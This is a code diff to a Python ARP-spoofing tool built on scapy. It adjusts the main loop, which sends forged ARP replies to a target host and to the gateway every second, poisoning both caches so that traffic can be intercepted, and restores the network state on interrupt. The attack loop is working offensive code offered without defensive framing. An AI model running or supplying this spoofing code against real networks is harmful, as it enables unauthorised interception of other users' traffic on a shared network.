@@ -26,15 +26,16 @@ class ArpSpoofer:
         scapy.send(packet, count=4, verbose=False)
 
     def start(self):
+        print("start arp spoofing")
         packets = 0
         try:
             while True:
                 self.spoofer(self.targetIP, self.gatewayIP)
                 self.spoofer(self.gatewayIP, self.targetIP)
-                print("\r[+] Sent packets " + str(packets)),
+               # print("\r[+] Sent packets " + str(packets)),
                 sys.stdout.flush()
                 packets += 2
-                time.sleep(2)
+                time.sleep(1)
         except KeyboardInterrupt:
             print("\nInterrupted Spoofing found CTRL + C------------ Restoring to normal state..")
             self.restore(self.targetIP, self.gatewayIP)
